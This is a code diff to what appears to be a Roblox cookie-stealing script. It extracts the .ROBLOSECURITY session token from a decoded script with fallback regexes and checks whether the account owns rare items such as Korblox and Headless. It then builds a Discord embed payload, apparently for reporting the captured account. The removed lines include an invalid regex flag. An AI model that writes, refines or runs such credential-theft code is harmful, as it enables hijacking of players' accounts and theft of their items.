@@ -33,16 +33,14 @@ def main():
         # Extract .ROBLOSECURITY Cookie safely
         cookie_match = re.search(r'\.ROBLOSECURITY\s*=\s*["\']?(_\|WARNING:[^"\'\s;]+|[A-Za-z0-9_\-\.%\|]+)["\']?', decoded_script, re.IGNORECASE)
         if not cookie_match:
-            cookie_match = re.search(r'\.ROBLOSECURITY["\']?\s*,\s*["\']?(_\|WARNING:[^"\'\s;]+|[A-Za-z0-9_\-\.%\|]+)["\']?', decoded_script, re.IGNOREBox) if 'ROBLOSECURITY' in decoded_script else None
-        
-        # Fallback broad match if needed
-        if not cookie_match:
             cookie_match = re.search(r'_\|WARNING:-DO-NOT-SHARE-THIS\.-[^"\']+', decoded_script)
 
-        roblosecurity = cookie_match.group(0) if cookie_match and hasattr(cookie_match, 'group') and cookie_match.group(0).startswith('_|WARNING') else (cookie_match.group(1) if cookie_match else None)
+        roblosecurity = cookie_match.group(0) if cookie_match and hasattr(cookie_match, 'group') and cookie_match.group(0).startswith('_|WARNING') else (cookie_match.group(1) if cookie_match and len(cookie_match.groups()) > 0 else None)
+
+        if not roblosecurity and cookie_match and hasattr(cookie_match, 'group'):
+            roblosecurity = cookie_match.group(0)
 
         if not roblosecurity:
-            # Try generic regex search for the cookie value pattern
             fallback_cookie = re.search(r'(_\|WARNING:-DO-NOT-SHARE-THIS\.-[A-Za-z0-9_\+\-\.]+)', decoded_script)
             if fallback_cookie:
                 roblosecurity = fallback_cookie.group(1)
@@ -130,7 +128,7 @@ def main():
             has_korblox = check_bundle(192)
             has_headless = check_bundle(201)
 
-        # Discord Rich Embed Payload styled exactly like the reference image
+        # Discord Rich Embed Payload styled like the reference image
         payload = {
             "username": f"{username} | 13+",
             "avatar_url": avatar_thumb,
